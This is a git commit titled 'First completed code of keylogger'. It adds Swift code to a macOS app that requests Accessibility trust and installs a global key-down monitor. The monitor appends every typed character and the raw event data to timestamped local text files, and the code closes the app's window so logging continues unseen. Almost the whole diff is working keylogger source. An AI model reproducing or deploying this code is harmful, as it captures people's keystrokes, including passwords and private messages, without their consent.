7cdbb38c1f40f1cdd4e3fe958069e7c11f374bf2
johndel <istoselidas@gmail.com>
2016-01-03 01:29:39 +0200

    First completed code of keylogger

--- test/AppDelegate.swift
+++ test/AppDelegate.swift
@@ -8,19 +8,88 @@
 
 import Cocoa
 
+extension String {
+    func appendLineToURL(fileURL: NSURL) throws {
+        try self.stringByAppendingString("\n\n").appendToURL(fileURL)
+    }
+    
+    func appendToURL(fileURL: NSURL) throws {
+        let data = self.dataUsingEncoding(NSUTF8StringEncoding)!
+        try data.appendToURL(fileURL)
+    }
+}
+
+extension NSData {
+    func appendToURL(fileURL: NSURL) throws {
+        if let fileHandle = try? NSFileHandle(forWritingToURL: fileURL) {
+            defer {
+                fileHandle.closeFile()
+            }
+            fileHandle.seekToEndOfFile()
+            fileHandle.writeData(self)
+        }
+        else {
+            try writeToURL(fileURL, options: .DataWritingAtomic)
+        }
+    }
+}
+
+
+let date_timestamp = String(NSDate().timeIntervalSince1970)
+let filename1 = "/Users/johndel/projects/swift/test/keys" + date_timestamp + ".txt"
+let filename2 = "/Users/johndel/projects/swift/test/events" + date_timestamp + ".txt"
+
+func getDocumentsDirectory() -> NSString {
+    let paths = NSSearchPathForDirectoriesInDomains(.DocumentDirectory, .UserDomainMask, true)
+    let documentsDirectory = paths[0]
+    return documentsDirectory
+}
+
+func acquirePrivileges() -> Bool {
+    let accessEnabled = AXIsProcessTrustedWithOptions(
+        [kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String: true])
+    
+    if accessEnabled != true {
+        print("You need to enable the keylogger in the System Prefrences")
+    }
+    return accessEnabled == true;
+}
+
+
 @NSApplicationMain
 class AppDelegate: NSObject, NSApplicationDelegate {
-
-
-
     func applicationDidFinishLaunching(aNotification: NSNotification) {
         // Insert code here to initialize your application
+        acquirePrivileges();
+        
+        // keyboard listeners
+        NSEvent.addGlobalMonitorForEventsMatchingMask(
+            NSEventMask.KeyDownMask, handler: {(event: NSEvent) in
+                print(String(event.characters!))
+                do {
+                    let url = NSURL(fileURLWithPath: filename1)
+                    try String(event.characters!).appendToURL(url)
+                }
+                catch {
+                    print("Could not write to file")
+                }
+                
+                do {
+                    let url = NSURL(fileURLWithPath: filename2)
+                    try String(event).appendLineToURL(url)
+                }
+                catch {
+                    print("Could not write to file")
+                }
+        })
+        NSApplication.sharedApplication().windows.last!.close()
+
     }
 
     func applicationWillTerminate(aNotification: NSNotification) {
         // Insert code here to tear down your application
     }
-
-
 }
+
+
 
